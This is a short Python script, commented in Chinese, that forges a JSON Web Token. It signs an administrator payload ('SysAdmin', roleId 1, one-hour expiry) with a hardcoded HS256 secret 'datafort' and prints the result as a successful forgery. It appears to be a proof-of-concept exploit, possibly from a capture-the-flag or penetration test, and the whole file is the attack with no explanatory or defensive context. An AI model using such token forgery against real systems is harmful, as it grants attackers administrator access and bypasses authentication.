import jwt
import time

# 确定密钥和算法
secret = "datafort"
algorithm = "HS256"

# 构造 Payload
payload = {
    "username": "SysAdmin",
    "roleId": 1,
    "exp": int(time.time()) + 3600  # 当前时间 + 1 小时
}

# 构造 JWT
token = jwt.encode(payload, secret, algorithm=algorithm)

# PyJWT v2.x 会返回字节串，需 decode 成 str
if isinstance(token, bytes):
    token = token.decode()

print("[+] 伪造 JWT 成功：")
print(token)
